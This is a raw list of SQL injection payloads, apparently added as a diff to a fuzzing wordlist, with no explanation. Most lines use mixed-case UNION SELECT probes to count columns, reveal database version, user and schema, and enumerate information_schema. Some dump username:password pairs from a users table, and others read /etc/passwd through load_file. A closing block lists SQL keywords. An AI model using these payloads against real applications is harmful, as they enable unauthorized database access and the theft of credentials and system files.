+0940930430924093' OrDER bY 9 --+#
+0940930430924093' OrDER by 10 --+#
+' gROUp bY 1 --+#
+' gROUp bY 2 --+#
+' gROUp bY 3 --+#
+' gROUp bY 4 --+#
+' gROUp bY 5 --+#
+' gROUp bY 6 --+#
+' gROUp bY 7 --+#
+' gROUp bY 8 --+#
+' gROUp bY 9 --+#
+' gROUp bY 10 --+#
+3123123' gROUp bY 1 --+#
+3123123' gROUp bY 2 --+#
+3123123' gROUp bY 3 --+#
+3123123' gROUp bY 4 --+#
+3123123' gROUp bY 5 --+#
+3123123' gROUp bY 6 --+#
+3123123' gROUp bY 7 --+#
+3123123' gROUp bY 8 --+#
+3123123' gROUp bY 9 --+#
+3123123' gROUp bY 10 --+#
+admin' oR 1=1 orDER bY 1 --+#
+admin' oR 1=1 orDER bY 2 --+#
+admin' oR 1=1 orDER bY 3 --+#
+admin' oR 1=1 orDER bY 4 --+#
+admin' oR 1=1 orDER bY 5 --+#
+admin' oR 1=1 orDER bY 6 --+#
+admin' oR 1=1 orDER bY 7 --+#
+admin' oR 1=1 orDER bY 8 --+#
+admin' oR 1=1 orDER bY 9 --+#
+312321' or 1=1 UnION sELECT 1--+#
+312321' or 1=1 UnION sELECT 1,2 --+#
+312321' or 1=1 UnION sELECT 1,2,3 --+#
+312321' or 1=1 UnION sELECT 1,2,3,4--+#
+312321' or 1=1 UnION sELECT 1,2,3,4,5 --+#
+312321' or 1=1 UnION sELECT 1,2,3,4,5,6 --+#
+312321' or 1=1 UnION sELECT 1,2,3,4,5,6,7 --+#
+312321' or 1=1 UnION sELECT 1,2,3,4,5,6,7,8 --+#
+312321' or 1=1 UnION sELECT 1,2,3,4,5,6,7,8,9 --+#
+' UniON seleCT 'a'
+' UniON seleCT 'a','b'
+' UniON seleCT 'a','b','c'
+' UniON seleCT 'a','b','c','d'
+' UniON seleCT 'a','b','c','d','e'
+' UniON seleCT 'a','b','c','d','e','f'
+' UniON seleCT 'a','b','c','d','e','f','g'
+' UniON seleCT 'a','b','c','d','e','f','g','h'
+' UniON seleCT 'a','b','c','d','e','f','g','h','i'
+' UniON seleCT 'a','b','c','d','e','f','g','h','i','j'
+' UnION sELECT NULL  --+#
+' UnION sELECT NULL,NULL --+#
+' UnION sELECT NULL,NULL,NULL --+#
+' UnION sELECT NULL,NULL,NULL,NULL --+#
+' UnION sELECT NULL,NULL,NULL,NULL,NULL --+#
+' UnION sELECT NULL,NULL,NULL,NULL,NULL,NULL --+#
+' UnION sELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL --+#
+' UnION sELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL --+#
+' UnION sELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL --+#
+' UnION sELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL --+#
+' UnION SeLeCT 1 --+#
+' UnION SeLeCT 1,2 --+#
+' UnION SeLeCT 1,2,3 --+#
+' UnION SeLeCT 1,2,3,4 --+#
+' UnION SeLeCT 1,2,3,4,5 --+#
+' UnION SeLeCT 1,2,3,4#
+' UnION SeLeCT 1,version(),3,4#
+' UnION SeLeCT 1,2,user(),4#
+' UNion sELeCT 1 --+#
+' UNion sELeCT 2 --+#
+' UNion sELeCT 3 --+#
+' UNion sELeCT 4 --+#
+' UNion sELeCT 5 --+#
+' UNion sELeCT 6 --+#
+' UNion sELeCT 7 --+#
+' UNion sELeCT 8 --+#
+' UNion sELeCT 9 --+#
+' UNion sELeCT 0 --+#
+' UNion sELeCT 10 --+#
+' unIOn seLECt 1,2 --+#
+' unIOn seLECt 1,2,3 --+#
+' unIOn seLECt 1,2,3,4 --+#
+' unIOn seLECt 1,2,3,4,5 --+#
+' unIOn seLECt 1,2,3,4,5,6 --+#
+' unIOn seLECt 1,2,3,4,5,6,7 --+#
+' unIOn seLECt 1,2,3,4,5,6,7,8 --+#
+' unIOn seLECt 1,2,3,4,5,6,7,8,9 --+#
+' unIOn seLECt 1,2,3,4,5,6,7,8,9,0 --+#
+UnION SeLECT 1,2,3,4,5 --+#
+UnION SeLECT 1,2,3,4,5,6 --+#
+UnION SeLECT 1,2,3,4,5,6,7 --+#
+UnION SeLECT 1,2,3,4,5,6,7,8 --+#
+UnION SeLECT 1,2,3,4,5,6,7,8,9 --+#
+UnION SeLECT 1,2,3,4,5,6,7,,8,9,0 --+#
+' UniON sELECT database() --+#
+' UniON sELECT daTAbaSE(),daTAbaSE() --+#
+' UniON sELECT daTAbaSE(),daTAbaSE(),daTAbaSE() --+#
+' UniON sELECT daTAbaSE(),daTAbaSE(),daTAbaSE(),daTAbaSE() --+#
+' UniON sELECT daTAbaSE(),daTAbaSE(),daTAbaSE(),daTAbaSE(),daTAbaSE() --+#
+' UniON sELECT daTAbaSE(),daTAbaSE(),daTAbaSE(),daTAbaSE(),daTAbaSE(),daTAbaSE() --+#
+' UniON sELECT daTAbaSE(),daTAbaSE(),daTAbaSE(),daTAbaSE(),daTAbaSE(),daTAbaSE(),daTAbaSE() --+#
+' UniON sELECT daTAbaSE(),daTAbaSE(),daTAbaSE(),daTAbaSE(),daTAbaSE(),daTAbaSE(),daTAbaSE(),daTAbaSE() --+#
+' UniON sELECT daTAbaSE(),daTAbaSE(),daTAbaSE(),daTAbaSE(),daTAbaSE(),daTAbaSE(),daTAbaSE(),daTAbaSE(),daTAbaSE() --+#
+' UniON sELECT daTAbaSE(),daTAbaSE(),daTAbaSE(),daTAbaSE(),daTAbaSE(),daTAbaSE(),daTAbaSE(),daTAbaSE(),daTAbaSE(),daTAbaSE() --+#
+UniON sELECT @@VERsION --+#
+UniON sELECT @@VERsION,@@VERsION --+#
+UniON sELECT @@VERsION,@@VERsION,@@VERsION --+#
+UniON sELECT @@VERsION,@@VERsION,@@VERsION,@@VERsION --+#
+UniON sELECT @@VERsION,@@VERsION,@@VERsION,@@VERsION,@@VERsION --+#
+UniON sELECT @@VERsION,@@VERsION,@@VERsION,@@VERsION,@@VERsION,@@VERsION --+#
+UniON sELECT @@VERsION,@@VERsION,@@VERsION,@@VERsION,@@VERsION,@@VERsION,@@VERsION --+#
+UniON sELECT @@VERsION,@@VERsION,@@VERsION,@@VERsION,@@VERsION,@@VERsION,@@VERsION,@@VERsION --+#
+UniON sELECT @@VERsION,@@VERsION,@@VERsION,@@VERsION,@@VERsION,@@VERsION,@@VERsION ,@@VERsION ,@@VERsION --+#
+UniON sELECT @@VERsION,@@VERsION,@@VERsION,@@VERsION,@@VERsION,@@VERsION,@@VERsION,@@VERsION ,@@VERsION ,@@VERsION --+#
+UNION SELECT sum(columnname ) FrOM tablename --
+' UNION selECT table_schema,table_name FrOM information_Schema.tables;#
+' uNION SelECT group_concat(username,0x3a,password),2,3 FrOM users--+#
+' uNION SelECT 1,group_concat(username,0x3a,password),3 FrOM users--+#
+' uNION SelECT 1,2,group_concat(username,0x3a,password) FrOM users--+#
+' uNION SelECT group_concat(table_name),2,3 FrOM InFORMATION_schEMA.taBLES where table_schema=daTAbaSE() --+
+' uNION SelECT 1,group_concat(table_name),3 FrOM InFORMATION_schEMA.taBLES where table_schema=daTAbaSE() --+
+' uNION SelECT 1,2,group_concat(table_name) FrOM InFORMATION_schEMA.taBLES where table_schema=daTAbaSE() --+
+' uNION SelECT group_concat(column_name),2,3 FrOM InFOrmATION_scheMA.Columns where table_name='users' --+
+' uNION SelECT 1,group_concat(column_name),3 FrOM InFOrmATION_scheMA.Columns where table_name='users' --+
+' uNION SelECT 1,2,group_concat(column_name) FrOM InFOrmATION_scheMA.Columns where table_name='users' --+#
+' or 1=1 UnION sELECT GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR)--+#
+' or 1=1 UnION sELECT GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR) --+#
+' or 1=1 UnION sELECT GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR) --+#
+' or 1=1 UnION sELECT GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR) --+#
+' or 1=1 UnION sELECT GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR) --+#
+' or 1=1 UnION sELECT GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR) --+#
+' or 1=1 UnION sELECT GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR) --+#
+' or 1=1 UnION sELECT GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR) --+#
+' or 1=1 UnION sELECT GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR) --+#
+' or 1=1 UnION sELECT GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR),GrOUp_ConCAT(@@verSION,0x3a,databASE(),0x3a,uSER(),0x3a,@@dataDIR) --+#
+' UnION SeLeCT VeRSION(),VeRSION(),VeRSION() --+#
+1323' UnION SeLeCT VeRSION(),VeRSION(),VeRSION(),VeRSION() --+#
+' UnION SeLeCT VeRSION(),VeRSION(),VeRSION(),VeRSION() --+#
+' UnION SeLeCT VeRSION(),VeRSION(),VeRSION(),VeRSION(),VeRSION() --+#
+' UnION SeLeCT 1,VeRSION(),3,4 --+#
+' UnION SeLeCT 1,2,USer(),4 --+#
+' UnION SeLeCT USer(),USer(),USer() --+#
+' UnION SeLeCT USer(),USer(),USer(),USer() --+#
+' UnION SeLeCT USer(),USer(),USer(),USer(),USer() --+#
+' UnION SeLeCT USer(),USer(),USer(),USer(),USer(),USer() --+#
+2314' UnION SeLeCT USer(),USer(),USer(),USer() --+#
+' UnION SeLeCT DATAbase(),DATAbase(),DATAbase() --+#
+' UnION SeLeCT DATAbase(),DATAbase(),DATAbase(),DATAbase() --+#
+3123213' UnION SeLeCT DATAbase(),DATAbase(),DATAbase(),DATAbase() --+#
+' UnION SeLeCT DATAbase(),DATAbase(),DATAbase(),DATAbase(),DATAbase() --+#
+' UnION SeLeCT GrOUp_ConCAT(TabLE_NaME),GrOUp_ConCAT(TabLE_NaME),GrOUp_ConCAT(TabLE_NaME) FrOm InfOrMAtioN_SchEMA.TabLEs WhErE TabLE_SCheMA=DataBASE() --+#
+123231' UnION SeLeCT GrOUp_ConCAT(TabLE_NaME),GrOUp_ConCAT(TabLE_NaME),GrOUp_ConCAT(TabLE_NaME),GrOUp_ConCAT(TabLE_NaME) FrOm InfOrMAtioN_SchEMA.TabLEs WhErE TabLE_SCheMA=DataBASE() --+#
+' UnION SeLeCT GrOUp_ConCAT(TabLE_NaME),GrOUp_ConCAT(TabLE_NaME),GrOUp_ConCAT(TabLE_NaME),GrOUp_ConCAT(TabLE_NaME) FrOm InfOrMAtioN_SchEMA.TabLEs WhErE TabLE_SCheMA=DataBASE() --+#
+' UnION SeLeCT GrOUp_ConCAT(TabLE_NaME),GrOUp_ConCAT(TabLE_NaME),GrOUp_ConCAT(TabLE_NaME),GrOUp_ConCAT(TabLE_NaME),GrOUp_ConCAT(TabLE_NaME) FrOm InfOrMAtioN_SchEMA.TabLEs WhErE TabLE_SCheMA=DataBASE() --+#
+' UnION SeLeCT GrOUp_ConCAT(CoLuMN_NAmE),GrOUp_ConCAT(CoLuMN_NAmE),GrOUp_ConCAT(CoLuMN_NAmE) FrOm InfOrMAtioN_SchEMA.CoLuMNs --+#
+' UnION SeLeCT GrOUp_ConCAT(CoLuMN_NAmE),GrOUp_ConCAT(CoLuMN_NAmE),GrOUp_ConCAT(CoLuMN_NAmE),GrOUp_ConCAT(CoLuMN_NAmE) FrOm InfOrMAtioN_SchEMA.CoLuMNs --+#
+3423432' UnION SeLeCT GrOUp_ConCAT(CoLuMN_NAmE),GrOUp_ConCAT(CoLuMN_NAmE),GrOUp_ConCAT(CoLuMN_NAmE),GrOUp_ConCAT(CoLuMN_NAmE) FrOm InfOrMAtioN_SchEMA.CoLuMNs --+#
+' UnION SeLeCT GrOUp_ConCAT(CoLuMN_NAmE),GrOUp_ConCAT(CoLuMN_NAmE),GrOUp_ConCAT(CoLuMN_NAmE),GrOUp_ConCAT(CoLuMN_NAmE),GrOUp_ConCAT(CoLuMN_NAmE) FrOm InfOrMAtioN_SchEMA.CoLuMNs --+#
+' unION seLECT GRoup_CONcat(coLuMN_nAME) fROm inFORMation_sCHEMa.COLumns whERE TaBLE_nAMe = 'users' --+#
+' unION seLECT GRoup_CONcat(coLuMN_nAME),GRoup_CONcat(coLuMN_nAME) fROm inFORMation_sCHEMa.COLumns whERE TaBLE_nAMe = 'users' --+#
+' unION seLECT GRoup_CONcat(coLuMN_nAME),GRoup_CONcat(coLuMN_nAME),GRoup_CONcat(coLuMN_nAME) fROm inFORMation_sCHEMa.COLumns whERE TaBLE_nAMe = 'users' --+#
+' unION seLECT GRoup_CONcat(coLuMN_nAME),GRoup_CONcat(coLuMN_nAME),GRoup_CONcat(coLuMN_nAME),GRoup_CONcat(coLuMN_nAME) fROm inFORMation_sCHEMa.COLumns whERE TaBLE_nAMe = 'users' --+#
+31231' unION seLECT GRoup_CONcat(coLuMN_nAME),GRoup_CONcat(coLuMN_nAME),GRoup_CONcat(coLuMN_nAME),GRoup_CONcat(coLuMN_nAME) fROm inFORMation_sCHEMa.COLumns whERE TaBLE_nAMe = 'users' --+#
+' unION seLECT GRoup_CONcat(coLuMN_nAME),GRoup_CONcat(coLuMN_nAME),GRoup_CONcat(coLuMN_nAME),GRoup_CONcat(coLuMN_nAME),GRoup_CONcat(coLuMN_nAME) fROm inFORMation_sCHEMa.COLumns whERE TaBLE_nAMe = 'users' --+#
+' UnION SeLeCT GrOUp_ConCAT(UseRNAME,0x3a,PasSWord),GrOUp_ConCAT(UseRNAME,0x3a,PasSWord),GrOUp_ConCAT(UseRNAME,0x3a,PasSWord) FrOm users --+#
+' UnION SeLeCT GrOUp_ConCAT(UseRNAME,0x3a,PasSWord),GrOUp_ConCAT(UseRNAME,0x3a,PasSWord),GrOUp_ConCAT(UseRNAME,0x3a,PasSWord),GrOUp_ConCAT(UseRNAME,0x3a,PasSWord) FrOm users --+#
+13123' UnION SeLeCT GrOUp_ConCAT(UseRNAME,0x3a,PasSWord),GrOUp_ConCAT(UseRNAME,0x3a,PasSWord),GrOUp_ConCAT(UseRNAME,0x3a,PasSWord),GrOUp_ConCAT(UseRNAME,0x3a,PasSWord) FrOm users --+#
+' UnION SeLeCT GrOUp_ConCAT(NAme,0x3a,PasSWd) FrOm users --+#
+' UnION SeLeCT GrOUp_ConCAT(NAme,0x3a,PasSWd),GrOUp_ConCAT(NAme,0x3a,PasSWd) FrOm users --+#
+' UnION SeLeCT GrOUp_ConCAT(NAme,0x3a,PasSWd),GrOUp_ConCAT(NAme,0x3a,PasSWd),GrOUp_ConCAT(NAme,0x3a,PasSWd) FrOm users --+#
+' UnION SeLeCT GrOUp_ConCAT(NAme,0x3a,PasSWd),GrOUp_ConCAT(NAme,0x3a,PasSWd),GrOUp_ConCAT(NAme,0x3a,PasSWd),GrOUp_ConCAT(NAme,0x3a,PasSWd) FrOm users --+#
+' UnION SeLeCT GrOUp_ConCAT(NAme,0x3a,PasSWd),GrOUp_ConCAT(NAme,0x3a,PasSWd),GrOUp_ConCAT(NAme,0x3a,PasSWd),GrOUp_ConCAT(NAme,0x3a,PasSWd),GrOUp_ConCAT(NAme,0x3a,PasSWd) FrOm users --+#
+' UnION SeLeCT GrOUp_ConCAT(NAme,0x3a,PasSWd),GrOUp_ConCAT(NAme,0x3a,PasSWd),GrOUp_ConCAT(NAme,0x3a,PasSWd),GrOUp_ConCAT(NAme,0x3a,PasSWd),GrOUp_ConCAT(NAme,0x3a,PasSWd),GrOUp_ConCAT(NAme,0x3a,PasSWd) FrOm users --+#
+' UnION SeLeCT GrOUp_ConCAT(UseRNAME,0x3a,PasSWord),GrOUp_ConCAT(UseRNAME,0x3a,PasSWord),GrOUp_ConCAT(UseRNAME,0x3a,PasSWord),GrOUp_ConCAT(UseRNAME,0x3a,PasSWord),GrOUp_ConCAT(UseRNAME,0x3a,PasSWord) FrOm users --+#
+' UnION SeLeCT GrOUp_ConCAT(TAblE_SchEMA,0x3a,TaBLE_Name) FrOm InfOrMAtioN_SchEMA.TabLEs --+#
+' UnION SeLeCT GrOUp_ConCAT(TAblE_SchEMA,0x3a,TaBLE_Name),GrOUp_ConCAT(TAblE_SchEMA,0x3a,TaBLE_Name) FrOm InfOrMAtioN_SchEMA.TabLEs --+#
+' UnION SeLeCT GrOUp_ConCAT(TAblE_SchEMA,0x3a,TaBLE_Name),GrOUp_ConCAT(TAblE_SchEMA,0x3a,TaBLE_Name),GrOUp_ConCAT(TAblE_SchEMA,0x3a,TaBLE_Name) FrOm InfOrMAtioN_SchEMA.TabLEs --+#
+7657756' UnION SeLeCT GrOUp_ConCAT(TAblE_SchEMA,0x3a,TaBLE_Name),GrOUp_ConCAT(TAblE_SchEMA,0x3a,TaBLE_Name),GrOUp_ConCAT(TAblE_SchEMA,0x3a,TaBLE_Name) FrOm InfOrMAtioN_SchEMA.TabLEs --+#
+' UnION SeLeCT GrOUp_ConCAT(TAblE_SchEMA,0x3a,TaBLE_Name),GrOUp_ConCAT(TAblE_SchEMA,0x3a,TaBLE_Name),GrOUp_ConCAT(TAblE_SchEMA,0x3a,TaBLE_Name),GrOUp_ConCAT(TAblE_SchEMA,0x3a,TaBLE_Name) FrOm InfOrMAtioN_SchEMA.TabLEs --+#
+' UnION SeLeCT GrOUp_ConCAT(TAblE_NaME,0x3a,ColuMN_NaME) FrOm InfOrMAtioN_SchEMA.COLuMNS --+#
+' UnION SeLeCT GrOUp_ConCAT(TAblE_NaME,0x3a,ColuMN_NaME),GrOUp_ConCAT(TAblE_NaME,0x3a,ColuMN_NaME)FrOm InfOrMAtioN_SchEMA.COLuMNS --+#
+' UnION SeLeCT GrOUp_ConCAT(TAblE_NaME,0x3a,ColuMN_NaME),GrOUp_ConCAT(TAblE_NaME,0x3a,ColuMN_NaME),GrOUp_ConCAT(TAblE_NaME,0x3a,ColuMN_NaME) FrOm InfOrMAtioN_SchEMA.COLuMNS --+#
+' UnION SeLeCT GrOUp_ConCAT(TAblE_NaME,0x3a,ColuMN_NaME),GrOUp_ConCAT(TAblE_NaME,0x3a,ColuMN_NaME),GrOUp_ConCAT(TAblE_NaME,0x3a,ColuMN_NaME),GrOUp_ConCAT(TAblE_NaME,0x3a,ColuMN_NaME) FrOm InfOrMAtioN_SchEMA.COLuMNS --+#
+' UniON SeLECT GrOUp_ConCAT(TAblE_NaME) FROM InForMatioN_ScheMA.COluMNs WhERE ColUMN_naME LikE '%user%' --+#
+' UniON SeLECT GrOUp_ConCAT(TAblE_NaME),GrOUp_ConCAT(TAblE_NaME) FROM InForMatioN_ScheMA.COluMNs WhERE ColUMN_naME LikE '%user%' --+#
+' UniON SeLECT GrOUp_ConCAT(TAblE_NaME),GrOUp_ConCAT(TAblE_NaME),GrOUp_ConCAT(TAblE_NaME) FROM InForMatioN_ScheMA.COluMNs WhERE ColUMN_naME LikE '%user%' --+#
+' UniON SeLECT GrOUp_ConCAT(TAblE_NaME),GrOUp_ConCAT(TAblE_NaME),GrOUp_ConCAT(TAblE_NaME),GrOUp_ConCAT(TAblE_NaME) FROM InForMatioN_ScheMA.COluMNs WhERE ColUMN_naME LikE '%user%' --+#
+' UNIOn SeLECT GrOUp_ConCAT(COLuMn_NaME) fROM InForMatioN_ScheMA.COluMNs wHErE TaBLE_NaME LIKE '%user%' --+#
+' UNIOn SeLECT GrOUp_ConCAT(COLuMn_NaME),GrOUp_ConCAT(COLuMn_NaME) fROM InForMatioN_ScheMA.COluMNs wHErE TaBLE_NaME LIKE '%user%' --+#
+' UNIOn SeLECT GrOUp_ConCAT(COLuMn_NaME),GrOUp_ConCAT(COLuMn_NaME),GrOUp_ConCAT(COLuMn_NaME) fROM InForMatioN_ScheMA.COluMNs wHErE TaBLE_NaME LIKE '%user%' --+#
+' UNIOn SeLECT GrOUp_ConCAT(COLuMn_NaME),GrOUp_ConCAT(COLuMn_NaME),GrOUp_ConCAT(COLuMn_NaME),GrOUp_ConCAT(COLuMn_NaME) fROM InForMatioN_ScheMA.COluMNs wHErE TaBLE_NaME LIKE '%user%' --+#
+' UNIOn SeLECT GrOUp_ConCAT(COLuMn_NaME),GrOUp_ConCAT(COLuMn_NaME),GrOUp_ConCAT(COLuMn_NaME),GrOUp_ConCAT(COLuMn_NaME),GrOUp_ConCAT(COLuMn_NaME) fROM InForMatioN_ScheMA.COluMNs wHErE TaBLE_NaME LIKE '%user%' --+#
+' UNIOn SeLECT GrOUp_ConCAT(COLuMn_NaME) fROM InForMatioN_ScheMA.COluMNs wHErE TaBLE_NaME LIKE '%pass%' --+#
+' UNIOn SeLECT GrOUp_ConCAT(COLuMn_NaME),GrOUp_ConCAT(COLuMn_NaME) fROM InForMatioN_ScheMA.COluMNs wHErE TaBLE_NaME LIKE '%pass%' --+#
+' UNIOn SeLECT GrOUp_ConCAT(COLuMn_NaME),GrOUp_ConCAT(COLuMn_NaME),GrOUp_ConCAT(COLuMn_NaME) fROM InForMatioN_ScheMA.COluMNs wHErE TaBLE_NaME LIKE '%pass%' --+#
+' UNIOn SeLECT GrOUp_ConCAT(COLuMn_NaME),GrOUp_ConCAT(COLuMn_NaME),GrOUp_ConCAT(COLuMn_NaME),GrOUp_ConCAT(COLuMn_NaME) fROM InForMatioN_ScheMA.COluMNs wHErE TaBLE_NaME LIKE '%pass%' --+#
+' UNIOn SeLECT GrOUp_ConCAT(COLuMn_NaME),GrOUp_ConCAT(COLuMn_NaME),GrOUp_ConCAT(COLuMn_NaME),GrOUp_ConCAT(COLuMn_NaME),GrOUp_ConCAT(COLuMn_NaME) fROM InForMatioN_ScheMA.COluMNs wHErE TaBLE_NaME LIKE '%pass%' --+#
+' UnION SelECT nAMe fRoM master..sysdatabases --+#
+' UnION SelECT nAMe,nAME fRoM master..sysdatabases --+#
+' UnION SelECT nAMe,nAME,naME fRoM master..sysdatabases --+#
+' UnION SelECT nAMe,nAME,naME,nAME fRoM master..sysdatabases --+#
+' UnION SelECT groUP_CONcat(SChemA_NaME),groUP_CONcat(SChemA_NaME),groUP_CONcat(SChemA_NaME) FROM infORMATION_schEMA.schEMATA --+#
+' UnION SelECT groUP_CONcat(SChemA_NaME),groUP_CONcat(SChemA_NaME),groUP_CONcat(SChemA_NaME),groUP_CONcat(SChemA_NaME) FROM infORMATION_schEMA.schEMATA --+#
+' UnION SelECT groUP_CONcat(SChemA_NaME),groUP_CONcat(SChemA_NaME),groUP_CONcat(SChemA_NaME),groUP_CONcat(SChemA_NaME),groUP_CONcat(SChemA_NaME) FROM infORMATION_schEMA.schEMATA --+#
+' unION SelECT loAD_fILE('/etc/passwd') --+#
+' unION SelECT loAD_fILE('/etc/passwd'),loAD_fILE('/etc/passwd') --+#
+' unION SelECT loAD_fILE('/etc/passwd'),loAD_fILE('/etc/passwd'),loAD_fILE('/etc/passwd') --+#
+' unION SelECT loAD_fILE('/etc/passwd'),loAD_fILE('/etc/passwd'),loAD_fILE('/etc/passwd'),loAD_fILE('/etc/passwd') --+#
+432432' unION SelECT loAD_fILE('/etc/passwd'),loAD_fILE('/etc/passwd'),loAD_fILE('/etc/passwd'),loAD_fILE('/etc/passwd') --+#
+' unION SelECT loAD_fILE('/etc/passwd'),loAD_fILE('/etc/passwd'),loAD_fILE('/etc/passwd'),loAD_fILE('/etc/passwd'),loAD_fILE('/etc/passwd') --+#
+' unION SelECT loAD_fILE('/etc/passwd'),loAD_fILE('/etc/passwd'),loAD_fILE('/etc/passwd'),loAD_fILE('/etc/passwd'),loAD_fILE('/etc/passwd'),loAD_fILE('/etc/passwd') --+#
+' unION SelECT loAD_fILE('/etc/passwd'),loAD_fILE('/etc/passwd'),loAD_fILE('/etc/passwd'),loAD_fILE('/etc/passwd'),loAD_fILE('/etc/passwd'),loAD_fILE('/etc/passwd'),loAD_fILE('/etc/passwd') --+#
+' unION SelECT loAD_fILE('/hacker/trophy') --+#
+@variable
+,@variable
+PRINT
+PRINT @@variable
+select
+insert
+as
+or
+procedure
+limit
+order by
+asc
+desc
+delete
+update
+distinct
+having
+truncate
+replace
+like
+handler
+bfilename
